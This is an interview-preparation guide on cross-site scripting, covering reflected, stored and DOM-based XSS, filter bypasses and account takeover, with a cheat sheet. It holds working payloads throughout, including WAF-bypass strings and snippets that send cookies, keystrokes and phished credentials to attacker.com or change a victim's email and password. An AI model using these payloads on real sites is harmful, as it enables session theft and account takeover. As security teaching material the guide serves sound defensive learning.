# 🔥 XSS (Cross-Site Scripting) — Interview Scenarios & Deep Explanations

> *"XSS isn't just `alert(1)`. It's about understanding WHERE your input lands and HOW the browser interprets it."*

---

## Scenario 1: Reflected XSS Discovery (Medium)

**🎯 Interviewer:** "You're testing a search page. When you search for 'laptop', the page says 'Results for: laptop'. How do you test for XSS?"

### ✅ Model Answer:

"The fact that my input is reflected back in the page is the first clue. I need to determine the **context** where it's reflected.

**Step 1 — Check reflection context (View Source):**
```html
<!-- Is it in HTML body? -->
<p>Results for: laptop</p>

<!-- Or inside an attribute? -->
<input value="laptop">

<!-- Or inside JavaScript? -->
<script>var search = 'laptop';</script>
```

Each context needs a different breakout strategy.

**Step 2 — Test with a harmless HTML tag first:**
```
<b>test</b>
```
If 'test' appears **bold**, the browser is rendering my HTML — no encoding.

**Step 3 — Escalate to JavaScript execution:**
```html
<script>alert(1)</script>
```

If `<script>` is blocked, I try alternatives:
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
```

**Step 4 — Verify the impact:**
- Can I access `document.cookie`? (session hijacking)
- Is the `HttpOnly` flag set on session cookies?
- Can I make requests on behalf of the victim? (XSS → CSRF)"

### 🔥 Follow-up Challenges:

**Q: "Why did you try `<b>test</b>` before `<script>alert(1)</script>`?"**

> "Two reasons:
> 1. **Stealth** — `<b>` is unlikely to trigger WAF rules, so I can confirm HTML injection without getting blocked
> 2. **Diagnosis** — If `<b>` is rendered but `<script>` is blocked, I know there's specific tag filtering, not output encoding. This tells me to use event handlers (`onerror`, `onload`) instead of `<script>` tags"

**Q: "What if the output is HTML-encoded? You see `&lt;script&gt;` in the source?"**

> "If the output is HTML-encoded in the body, I look for other contexts:
> 1. **Inside an attribute:** `" onfocus=alert(1) autofocus="` — break out of the attribute
> 2. **Inside JavaScript:** `'; alert(1); '` — break out of the string
> 3. **Inside a URL:** `javascript:alert(1)` in href attributes
> 4. **DOM-based:** Check if JS reads from `location.hash` or `document.URL` and writes to innerHTML
> 5. Sometimes encoding is applied inconsistently — search field might be encoded but error page isn't"

---

## Scenario 2: Stored XSS (Medium-Hard)

**🎯 Interviewer:** "You find a comment section on a blog. How do you test for stored XSS, and why is it more dangerous than reflected?"

### ✅ Model Answer:

"Stored XSS is more dangerous because:
1. **No victim interaction needed** — the payload executes for every user who views the page
2. **Persistence** — it stays until someone removes it
3. **Wider impact** — can hit admins, other users, anyone who visits

**Testing approach:**

I'd submit a comment with escalating payloads:

```
Test 1: Plain text with special chars → Do <>"'& appear unchanged?
Test 2: <b>bold</b> → Is HTML rendered?
Test 3: <img src=x onerror=alert(document.domain)>
Test 4: If 3 is blocked → <svg/onload=alert(1)>
```

**But I'd think beyond the comment body:**
- **Username field** — register as `<img src=x onerror=alert(1)>` — does it fire when displayed?
- **Profile bio/about** — often less sanitized than main content
- **File name** — upload `"><img src=x onerror=alert(1)>.jpg` — if the filename is reflected

**Impact demonstration:**
```javascript
// Cookie stealing (if HttpOnly not set)
<script>new Image().src='https://attacker.com/steal?c='+document.cookie</script>

// Session hijacking via fetch
<script>fetch('https://attacker.com/log?cookie='+document.cookie)</script>

// Keylogger injection
<script>document.onkeypress=function(e){fetch('https://attacker.com/keys?k='+e.key)}</script>
```"

### 🔥 Follow-ups:

**Q: "The comment allows basic HTML like `<b>` and `<i>` but strips `<script>`. How do you bypass?"**

> "This is a blacklist approach — they're blocking specific tags. Bypass strategies:
> 1. **Event handlers on allowed tags:** `<b onmouseover=alert(1)>hover me</b>`
> 2. **Other tags not in blacklist:** `<details open ontoggle=alert(1)>`, `<marquee onstart=alert(1)>`
> 3. **Case variation:** `<ScRiPt>alert(1)</ScRiPt>`
> 4. **Nested tags:** `<scr<script>ipt>alert(1)</script>` — if filter removes `<script>` once, the remaining text forms a new one
> 5. **Encoding in attributes:** `<a href=&#106;avascript:alert(1)>click</a>`"

---

## Scenario 3: DOM-Based XSS (Hard)

**🎯 Interviewer:** "You notice the page uses `document.location.hash` in its JavaScript. How would you exploit this?"

### ✅ Model Answer:

"DOM-based XSS is different because the payload never reaches the server — the vulnerability is entirely in client-side JavaScript.

**First, I read the JavaScript source:**
```javascript
// Vulnerable code example
var hash = document.location.hash.substring(1);
document.getElementById('content').innerHTML = hash;
```

**The problem:** `location.hash` is user-controlled, and `innerHTML` renders HTML.

**Exploitation:**
```
https://target.com/page#<img src=x onerror=alert(1)>
```

The hash value gets written directly to the DOM as HTML, executing my JavaScript.

**Why this is tricky:**
- The payload is in the URL fragment (`#...`), which is NOT sent to the server
- Server-side WAFs won't see it
- Server-side logging won't capture it
- Only client-side analysis reveals this

**Common DOM sinks to look for:**
```javascript
// Dangerous sinks (where data gets written)
element.innerHTML = userInput;
document.write(userInput);
eval(userInput);
setTimeout(userInput);
element.setAttribute('onclick', userInput);
window.location = userInput;

// Dangerous sources (where user input comes from)
document.location.hash
document.location.search
document.referrer
window.name
postMessage data
```"

### 🔥 Follow-ups:

**Q: "How do you find DOM XSS systematically?"**

> "I follow a source-to-sink methodology:
> 1. **List all sources** — places where user input enters the JavaScript (URL, hash, referrer, postMessage)
> 2. **Trace the data flow** — follow each source through the code to see where it ends up
> 3. **Identify sinks** — does it reach innerHTML, document.write, eval, or similar?
> 4. **Check for sanitization** — is the data encoded/escaped between source and sink?
> 5. Tools: Browser DevTools debugger, DOM Invader (Burp), or manually reading JS"

**Q: "What if they use `innerText` instead of `innerHTML`?"**

> "`innerText` is safe for XSS because it treats everything as text, not HTML. The browser won't parse tags or execute scripts. If they use `innerText`, I'd look for other sinks in the same codebase — developers rarely use safe methods everywhere."

---

## Scenario 4: XSS Filter Bypass (Hard)

**🎯 Interviewer:** "The application has a WAF that blocks `<script>`, `alert`, `onerror`, and `javascript:`. How do you get XSS?"

### ✅ Model Answer:

"I'd systematically try bypass categories:

**1. Alternative event handlers:**
```html
<svg onload=confirm(1)>
<body onpageshow=print()>
<input onfocus=prompt(1) autofocus>
<details open ontoggle=confirm(1)>
<marquee onstart=confirm(1)>
```

**2. Alternative execution functions (alert is blocked):**
```html
<img src=x onerror=confirm(1)>       <!-- confirm instead of alert -->
<img src=x onerror=prompt(1)>        <!-- prompt instead of alert -->
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>  <!-- base64 decoded alert(1) -->
<img src=x onerror=top['al'+'ert'](1)>  <!-- string concatenation -->
```

**3. Encoding bypasses:**
```html
<!-- HTML entity encoding -->
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">click</a>

<!-- Unicode escapes in JS -->
<script>\u0061lert(1)</script>

<!-- Hex encoding -->
<a href="&#x6A;avascript:alert(1)">click</a>
```

**4. Tag mutation/breaking:**
```html
<svg/onload=alert(1)>           <!-- / instead of space -->
<img src=x onerror   =alert(1)> <!-- extra spaces -->
<IMG """><SCRIPT>alert(1)</SCRIPT>">  <!-- malformed HTML -->
```

**5. If everything HTML is blocked, look for JavaScript context:**
```
If input is inside: var x = 'USER_INPUT';
Payload: '; alert(1); '
Or: \'; alert(1); \'  (if backslash escaping)
Or: </script><script>alert(1)</script>
```"

### 🔥 Follow-ups:

**Q: "Why does `<svg/onload=alert(1)>` work? The tag isn't properly formatted."**

> "Browser HTML parsers are extremely lenient. They're designed to render broken HTML because so much of the web has malformed markup. The browser treats `/` as whitespace between tag name and attribute, so `<svg/onload=...>` is parsed exactly like `<svg onload=...>`. This leniency is what makes XSS filter bypass possible — the filter uses strict pattern matching, but the browser uses loose parsing."

---

## Scenario 5: XSS to Account Takeover (Hard)

**🎯 Interviewer:** "You found stored XSS. The session cookie has HttpOnly flag. How do you still take over accounts?"

### ✅ Model Answer:

"HttpOnly prevents JavaScript from reading cookies, but XSS is still devastating:

**Approach 1 — Perform actions as the victim:**
```javascript
// Change victim's email to mine (then password reset)
fetch('/api/account/email', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'}),
  credentials: 'include'  // sends cookies automatically
});
```

**Approach 2 — Extract CSRF tokens and perform privileged actions:**
```javascript
// Get the page with CSRF token, then use it
fetch('/settings').then(r => r.text()).then(html => {
  let token = html.match(/csrf_token.*?value="(.*?)"/)[1];
  fetch('/api/change-password', {
    method: 'POST',
    body: 'csrf_token=' + token + '&new_password=hacked123',
    credentials: 'include'
  });
});
```

**Approach 3 — Phishing within the trusted domain:**
```javascript
// Replace page content with fake login form
document.body.innerHTML = '<h2>Session expired. Please login again.</h2>' +
  '<form action="https://attacker.com/steal"><input name="user" placeholder="Username">' +
  '<input name="pass" type="password" placeholder="Password">' +
  '<button>Login</button></form>';
```

**Approach 4 — Capture keystrokes:**
```javascript
document.addEventListener('keypress', function(e) {
  fetch('https://attacker.com/log?key=' + e.key);
});
```

HttpOnly protects the cookie but NOT the session. XSS within an authenticated context can do anything the user can do."

---

## Quick Recall — XSS Cheat Sheet

```
CONTEXTS:
  HTML body:      <script>alert(1)</script>
  HTML attribute: " onfocus=alert(1) autofocus="
  JavaScript:     '; alert(1); '
  URL/href:       javascript:alert(1)
  
FILTER BYPASS:
  Tag blocked:    <img>, <svg>, <details>, <body>, <marquee>
  alert blocked:  confirm(), prompt(), eval(atob('YWxlcnQoMSk='))
  Event blocked:  onload, onfocus, ontoggle, onpageshow, onstart
  Encoding:       HTML entities, Unicode \u escapes, hex &#x
  
DOM XSS:
  Sources: location.hash, location.search, document.referrer, postMessage
  Sinks:   innerHTML, document.write, eval, setTimeout, location
  
IMPACT:
  Cookie theft (if no HttpOnly)
  Action as victim (even WITH HttpOnly)  
  Phishing on trusted domain
  Keylogging
  Worm (self-propagating stored XSS)
```

---

> **Practice drill:** Take each scenario and explain it to your wall. Time yourself. If you take more than 2 minutes per scenario, practice until you can do it in 90 seconds.
